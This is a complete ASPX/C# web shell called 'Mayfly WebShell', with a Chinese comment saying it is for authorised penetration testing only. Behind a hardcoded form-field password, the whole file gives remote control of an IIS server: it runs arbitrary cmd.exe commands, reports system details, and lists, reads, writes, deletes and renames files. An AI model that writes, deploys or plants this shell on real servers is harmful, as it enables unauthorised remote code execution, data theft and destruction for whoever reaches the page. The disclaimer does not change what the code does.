<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Collections.Generic" %>
<%@ Import Namespace="System.Web.Script.Serialization" %>
<script runat="server">
// ============================================================
//  Mayfly WebShell - ASPX 服务端脚本 (C# / .NET)
//  仅用于授权渗透测试与自有资产管理，禁止用于未授权访问。
//  部署到 IIS 后，请修改 key 为高强度连接密码。
// ============================================================

void Resp(string status, string data, string msg)
{
    var d = new Dictionary<string, object> {
        {"status", status},
        {"data", Convert.ToBase64String(Encoding.UTF8.GetBytes(data))},
        {"message", msg}
    };
    string json = new JavaScriptSerializer().Serialize(d);
    Response.Write(Convert.ToBase64String(Encoding.UTF8.GetBytes(json)));
    Response.End();
}

long ToUnix(DateTime dt)
{
    var epoch = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
    return (long)(dt.ToUniversalTime().Subtract(epoch).TotalSeconds);
}

string RunCmd(string cmd)
{
    var psi = new ProcessStartInfo();
    psi.FileName = "cmd";
    psi.Arguments = "/c " + cmd + " 2>&1";
    psi.RedirectStandardOutput = true;
    psi.UseShellExecute = false;
    psi.CreateNoWindow = true;
    using (var p = Process.Start(psi))
    {
        string o = p.StandardOutput.ReadToEnd();
        p.WaitForExit();
        return o;
    }
}

protected void Page_Load(object sender, EventArgs e)
{
    Response.ContentType = "text/plain";
    string key = "mayfly";
    string payload = Request.Form[key];
    if (string.IsNullOrEmpty(payload)) payload = Request.Form["mayfly"];
    if (string.IsNullOrEmpty(payload)) { Resp("error", "", "empty payload"); return; }

    string json;
    try {
        json = Encoding.UTF8.GetString(Convert.FromBase64String(payload));
    } catch (Exception ex) { Resp("error", "", "bad base64: " + ex.Message); return; }

    var ser = new JavaScriptSerializer();
    Dictionary<string, object> req;
    try {
        req = ser.Deserialize<Dictionary<string, object>>(json);
    } catch (Exception ex) { Resp("error", "", "bad json: " + ex.Message); return; }

    string action = req.ContainsKey("action") ? Convert.ToString(req["action"]) : "";
    Dictionary<string, object> ps = new Dictionary<string, object>();
    if (req.ContainsKey("params") && req["params"] is Dictionary<string, object>)
        ps = (Dictionary<string, object>)req["params"];

    string G(string n) { object v; return ps.TryGetValue(n, out v) && v != null ? v.ToString() : ""; }

    try
    {
        switch (action)
        {
            case "cmd":
                string cmd = G("cmd");
                if (string.IsNullOrEmpty(cmd)) { Resp("error", "", "empty cmd"); return; }
                Resp("ok", RunCmd(cmd), "");
                break;

            case "sysinfo":
                string info = ".NET: " + Environment.Version
                    + "\nOS: " + Environment.OSVersion
                    + "\nUser: " + Environment.UserName
                    + "\nCWD: " + Directory.GetCurrentDirectory();
                Resp("ok", info, "");
                break;

            case "fileList":
                string path = G("path");
                if (string.IsNullOrEmpty(path)) path = ".";
                string full = Path.GetFullPath(path);
                if (!Directory.Exists(full)) { Resp("error", "", "not a directory"); return; }
                var sb = new StringBuilder();
                sb.Append(full).Append("\n");
                var parent = Directory.GetParent(full);
                if (parent != null) sb.Append("d|0|0|..\t").Append(parent.FullName).Append("\n");
                var di = new DirectoryInfo(full);
                foreach (var d in di.GetDirectories())
                    sb.Append("d|0|").Append(ToUnix(d.LastWriteTime)).Append("|").Append(d.Name).Append("\n");
                foreach (var f in di.GetFiles())
                    sb.Append("f|").Append(f.Length).Append("|").Append(ToUnix(f.LastWriteTime)).Append("|").Append(f.Name).Append("\n");
                Resp("ok", sb.ToString(), "");
                break;

            case "fileRead":
                string rp = G("path");
                if (!File.Exists(rp)) { Resp("error", "", "not a file"); return; }
                Resp("ok", File.ReadAllText(rp, Encoding.UTF8), "");
                break;

            case "fileWrite":
                string wp = G("path");
                byte[] wb = Convert.FromBase64String(G("content"));
                File.WriteAllBytes(wp, wb);
                Resp("ok", "written " + wb.Length + " bytes", "");
                break;

            case "fileDelete":
                if (File.Exists(G("path"))) File.Delete(G("path"));
                else if (Directory.Exists(G("path"))) Directory.Delete(G("path"));
                else { Resp("error", "", "not found"); return; }
                Resp("ok", "deleted", "");
                break;

            case "fileRename":
                File.Move(G("path"), G("newPath"));
                Resp("ok", "renamed", "");
                break;

            case "fileMkdir":
                Directory.CreateDirectory(G("path"));
                Resp("ok", "created", "");
                break;

            default:
                Resp("error", "", "unknown action: " + action);
                break;
        }
    }
    catch (Exception ex)
    {
        Resp("error", "", ex.ToString());
    }
}
</script>